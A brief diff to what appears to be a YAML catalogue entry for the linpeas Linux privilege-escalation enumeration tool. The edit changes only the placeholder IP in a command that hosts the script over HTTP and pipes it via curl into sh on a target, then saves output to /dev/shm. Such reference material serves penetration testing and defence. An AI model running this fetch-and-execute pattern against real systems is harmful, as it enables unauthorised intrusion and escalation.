@@ -7,7 +7,7 @@ functions:
     - description: Host script, `curl`, and run
       code: |
        sudo python3 -m http.server 80
-       curl 192.0.2.2/linpeas.sh | sh
+       curl 198.51.100.2/linpeas.sh | sh
     - description: Output to file, read with colors
       code: |
        linpeas -a > /dev/shm/linpeas.txt
